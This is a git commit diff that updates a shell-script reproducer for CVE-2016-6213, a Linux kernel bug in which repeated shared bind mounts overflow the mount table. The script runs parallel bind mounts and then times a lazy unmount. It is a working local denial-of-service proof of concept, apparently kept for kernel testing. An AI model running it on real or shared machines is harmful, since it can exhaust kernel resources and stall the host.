cc1ac604fb379b93e966d858a47221158f22f5a4
Andrei Vagin <avagin@virtuozzo.com>
2016-10-19 02:56:26 +0300

    Improve reproducer for CVE-2016-6213

---
+++ mounts/README.md
@@ -0,0 +1,2 @@
+= kernel: Overflowing kernel mount table using shared bind mount =
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6213
--- mounts/run.sh
+++ mounts/run.sh
@@ -1,17 +1,31 @@
-set -m -e
+set -e -m
+
+mount -t tmpfs zdtm /mnt
+mkdir -p /mnt/1 /mnt/2
+mount -t tmpfs zdtm /mnt/1
+mount --make-shared /mnt/1
 
 iteration=30
 if [ -n "$1" ]; then
 	iteration=$1
 fi
 
-mount -t tmpfs xxx /mnt
-mount --make-shared /mnt
-
 for i in `seq $iteration`; do
-	mount --bind /mnt `mktemp -d /mnt/test.XXXXXX` &
+	mount --bind /mnt/1 `mktemp -d /mnt/1/test.XXXXXX` &
 done
-wait
 
-cat /proc/self/mountinfo | grep /mnt | wc -l
-time umount -l /mnt
+ret=0
+for i in `seq $iteration`; do
+	wait -n || ret=1
+done
+
+[ "$ret" -ne 0 ] && {
+	time umount -l /mnt/1
+	exit 0
+}
+
+mount --rbind /mnt/1 /mnt/2
+nr=`cat /proc/self/mountinfo | grep zdtm | wc -l`
+echo -n "umount -l /mnt/1 -> $nr	"
+/usr/bin/time -f '%E' umount -l /mnt/1
+umount /mnt/2
